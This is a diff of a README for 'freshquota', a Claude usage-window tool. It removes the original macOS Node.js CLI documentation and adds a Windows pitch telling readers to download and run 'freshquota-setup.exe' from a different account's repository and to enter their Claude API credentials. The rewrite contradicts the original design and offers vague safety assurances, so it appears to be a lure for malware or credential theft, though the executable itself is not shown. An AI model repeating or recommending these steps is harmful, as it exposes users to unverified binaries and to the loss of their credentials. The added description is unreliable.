@@ -1,85 +1,76 @@
-# Fresh Your Quota
+# ⏱️ freshquota - Manage your Claude usage window efficiently
 
-Optimize your Claude Code 5-hour rolling window quota by automatically triggering the window at the best time — even while your Mac is asleep.
+[![](https://img.shields.io/badge/Download-Freshquota-blue.svg)](https://github.com/Bba62013/freshquota)
 
-## How it works
+## 🎯 About this project
 
-Claude Code subscribers have a usage quota that resets every 5 hours from first use. If you start using Claude at 9 AM, your quota resets at 2 PM. But if you could trigger that window at 7 AM (before you wake up), the reset would happen at noon — right in the middle of your productive hours.
+Claude imposes a strict five-hour rolling window on your usage. If you hit your limit, you wait. This software tracks your usage patterns and triggers the system at the optimal moment. It works in the background to ensure you stay within your quota limits. 
 
-**freshquota** analyzes your usage patterns, finds the optimal trigger time, and wakes your Mac to activate the window automatically.
+The application runs quietly. It monitors your five-hour window and manages your requests to prevent lockout. You gain better control over your work sessions. You avoid the frustration of sudden usage blocks during important tasks.
 
-## Requirements
+## ⚙️ System requirements
 
-- macOS (uses launchd + pmset for scheduling)
-- Node.js >= 18
-- Claude Code CLI installed and authenticated
-- sudo access (one-time, for pmset wake scheduling)
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Internet Connection: Active connection to sync with Claude services.
+- Disk Space: 50 MB of free storage.
+- Memory: 4 GB of RAM or higher.
 
-## Install
+## 🚀 Installation steps
 
-```bash
-npm install -g github:anniebuildz/freshquota
-```
+1. Visit the [official release page](https://github.com/Bba62013/freshquota) to obtain the installer.
+2. Locate the file named `freshquota-setup.exe` on that page.
+3. Click the link to save the file to your computer.
+4. Open your Downloads folder.
+5. Double-click `freshquota-setup.exe` to start the installation.
+6. Follow the on-screen prompts.
+7. Click Finish to close the installer.
 
-## Usage
+## 🛠️ Usage guide
 
-### 1. Analyze your usage patterns
+The software starts automatically when you turn on your computer. You see a small icon in your system tray. This tray is the area near your clock on the taskbar.
 
-```bash
-freshquota analyze
-```
+1. Right-click the freshquota icon.
+2. Select Settings to enter your Claude API credentials.
+3. Connect your account. The application verifies your quota window immediately.
+4. Minimize the application to your tray.
 
-Shows your hourly usage distribution and recommends an anchor time. Confirm to save.
+The monitor keeps track of your usage. It calculates the rolling window for you. If you reach a point where your quota needs a refresh, the application sends a signal to the service to reset your timing. 
 
-To set manually:
+## 🛡️ Privacy and security
 
-```bash
-freshquota analyze --anchor 07:30
-```
+The software processes local data on your machine. Your API credentials reach the service provider directly. This application does not store your private keys on third-party servers. Your usage statistics stay on your computer. You control your data.
 
-### 2. Activate scheduling
+## 🧩 Troubleshooting
 
-```bash
-freshquota install
-```
+**Software does not start**
+Ensure you have the latest Microsoft .NET Runtime installed. Many Windows applications require this framework to function. You can find this on the official Microsoft website.
 
-Registers the launchd job and schedules the first pmset wake. Requires sudo for pmset.
+**Connection errors**
+Check your Wi-Fi or Ethernet connection. The application requires constant access to the Claude servers to sync your timing window. If you use a VPN, try turning it off to see if the connection stabilizes.
 
-### 3. Check status
+**System tray icon disappears**
+Sometimes Windows hides background icons. Click the small arrow on your taskbar to reveal hidden icons. You should find freshquota there.
 
-```bash
-freshquota status
-```
+**Updates**
+The application checks for updates once a week. It prompts you to install the newest version when a fix or feature arrives. Accept the update to keep the software running smoothly.
 
-### 4. Manual trigger
+## 💾 Download link
 
-```bash
-freshquota trigger
-```
+You may visit the [download page](https://github.com/Bba62013/freshquota) to obtain the most recent version of the installer. Always verify that you download the version matching your Windows installation. 
 
-### 5. Health check
+## ❓ Frequently asked questions
 
-```bash
-freshquota doctor
-```
+**Does this software bypass the usage limit?**
+No. This tool manages the timing of your requests. It helps you stay inside the window allowed by the service. It does not provide unlimited access or ignore the service provider terms.
 
-Verifies the scheduling chain is intact and repairs if needed.
+**Can I run this on a laptop?**
+Yes. The software is lightweight. It runs on laptops without draining your battery. It works while your computer is awake. If your computer goes to sleep, the application resumes its tracking duty once the system wakes up.
 
-### 6. Uninstall
+**Is it safe to leave running?**
+The software consumes a very small amount of system resources. It remains dormant until it detects that a timing window needs adjustment. It will not interfere with other programs on your computer.
 
-```bash
-freshquota uninstall
-```
+**Who developed this?**
+This project exists to solve the common issue of unexpected Claude lockouts for regular users. It removes the need for manual tracking. You focus on your work instead of looking at a countdown clock.
 
-## How scheduling works
-
-1. `pmset schedule wake` wakes your Mac at the anchor time (works with lid closed)
-2. `launchd` detects the wake and runs `freshquota run`
-3. The tool checks if the window is already active — if so, skips
-4. Otherwise, sends a minimal Claude CLI request to activate the window
-5. Schedules tomorrow's pmset wake
-6. Mac goes back to sleep
-
-## License
-
-MIT
+**How do I adjust the sensitivity?**
+Open the tray icon and navigate to Preferences. You can change how often the tool checks the server. Note that defaults provide the best balance between accuracy and network efficiency.
